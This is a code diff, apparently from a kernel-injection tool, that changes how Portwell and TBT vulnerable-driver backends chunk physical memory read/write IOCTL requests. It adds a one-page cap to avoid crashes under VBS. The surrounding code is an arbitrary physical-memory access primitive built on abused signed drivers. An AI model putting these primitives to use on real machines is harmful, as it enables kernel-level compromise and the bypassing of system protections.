@@ -59,6 +59,18 @@ inline bool IsKernelAddress(uint64_t va)
   // Canonical kernel-space address on x64.
   return (va >> 48) == 0xFFFF;
 }
+
+// Per-IOCTL transfer cap. Both vulnerable drivers map the whole transfer with a
+// single MmMapIoSpace(phys, len, MmNonCached) and then copy to/from the result
+// without a NULL check, so a failed map is a guaranteed BSOD 0x3B inside the
+// driver (verified in crash dumps: rep movsb faulted with rsi=0). Under VBS the
+// kernel refuses to map protected RAM pages PER PAGE (dumps: neighbouring low
+// pages mapped fine, one page at 0x106000 refused on every run) - there is no
+// size threshold that avoids this, so requests are kept to one page both to
+// stay in the common small-mapping path and to minimise what a single failed
+// request takes down. The real guard is the VBS check in kernel_injector.cpp
+// refusing to run these backends at all while VBS is active.
+constexpr size_t kMaxIoChunk = kPageSize;
 }    // namespace
 
 bool KernelMem::EnsurePageTable()
@@ -383,7 +395,7 @@ bool PortwellBackend::ReadPhys(uint64_t phys, void *buf, size_t size)
 
   while(size > 0)
   {
-    size_t chunk = size > kMaxPhysChunk ? kMaxPhysChunk : size;
+    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;
 
     PortwellProtocol::PhysRwRequest req;
     req.phys = phys;
@@ -410,11 +422,11 @@ bool PortwellBackend::WritePhys(uint64_t phys, const void *buf, size_t size)
 
   // The driver copies data that follows the 16-byte request header, so the
   // input buffer is header + data.
-  std::vector<uint8_t> input(sizeof(PortwellProtocol::PhysRwRequest) + kMaxPhysChunk);
+  std::vector<uint8_t> input(sizeof(PortwellProtocol::PhysRwRequest) + kMaxIoChunk);
 
   while(size > 0)
   {
-    size_t chunk = size > kMaxPhysChunk ? kMaxPhysChunk : size;
+    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;
 
     PortwellProtocol::PhysRwRequest *req = (PortwellProtocol::PhysRwRequest *)input.data();
     req->phys = phys;
@@ -497,7 +509,7 @@ bool TbtBackend::ReadPhys(uint64_t phys, void *buf, size_t size)
 
   while(size > 0)
   {
-    size_t chunk = size > kMaxPhysChunk ? kMaxPhysChunk : size;
+    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;
 
     // Request layout: {qword phys, byte unit}. The byte count is derived by
     // the driver from the output buffer length.
@@ -525,11 +537,11 @@ bool TbtBackend::WritePhys(uint64_t phys, const void *buf, size_t size)
 
   // Request layout: {qword phys, byte unit, dword count, data...}
   const size_t kHeader = 13;
-  std::vector<uint8_t> input(kHeader + kMaxPhysChunk);
+  std::vector<uint8_t> input(kHeader + kMaxIoChunk);
 
   while(size > 0)
   {
-    size_t chunk = size > kMaxPhysChunk ? kMaxPhysChunk : size;
+    size_t chunk = size > kMaxIoChunk ? kMaxIoChunk : size;
 
     uint32_t count = (uint32_t)chunk;
     memcpy(&input[0], &phys, sizeof(phys));
